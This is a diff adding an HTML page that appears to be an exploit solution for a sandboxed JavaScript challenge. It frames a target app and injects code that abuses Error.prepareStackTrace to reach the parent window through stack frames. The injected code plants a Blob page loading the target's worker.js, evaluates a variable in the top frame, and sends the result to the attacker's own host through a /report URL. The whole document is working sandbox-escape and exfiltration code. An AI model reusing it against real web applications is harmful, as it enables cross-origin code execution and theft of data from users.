@@ -1,0 +1,57 @@
+<iframe id="orig"></iframe>
+<iframe id="f"></iframe>
+<script>
+		const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
+		;(async () => {
+			const base = `${location.protocol}//${location.host}`
+			const target = new URLSearchParams(location.search).get('target') ?? 'http://localhost:8763'
+			orig.src = target
+			await sleep(500)
+			f.src =
+				target +
+				'/?code=' +
+				encodeURIComponent(`
+	try {
+		null.f()
+	} catch (e) {
+		TypeError = e.constructor
+	}
+	Error = TypeError.prototype.__proto__.constructor
+	Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
+	try{
+		null.f()
+	}catch(e){
+		g=e.stack[2]?.getFunction().arguments[0].target
+		const blob = new g.Blob(['<h1>peko</h1><script src="${target}/worker.js"><\/script>'], {type: 'text/html'})
+		const url = g.URL.createObjectURL(blob)
+		g.postMessage({ type: 'error', content: 'hello' + '<meta http-equiv="refresh" content="0; url='+url+'">' })
+	}
+	`)
+			await sleep(2000)
+			console.log('posting')
+			const canvas = document.createElement('canvas').transferControlToOffscreen()
+			f.contentWindow.postMessage(
+				{
+					type: 'init',
+					code: `
+	try {
+		null.f()
+	} catch (e) {
+		TypeError = e.constructor
+	}
+	Error = TypeError.prototype.__proto__.constructor
+	Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
+	try{
+		null.f()
+	}catch(e){
+		const g = e.stack[2].getFunction().arguments[0].target
+		g.location = ${JSON.stringify(base)} + '/report?result=' + g.encodeURIComponent(g.top[0].eval('fallback'))
+	}
+	`,
+					canvas
+				},
+				'*',
+				[canvas]
+			)
+		})()
+</script>
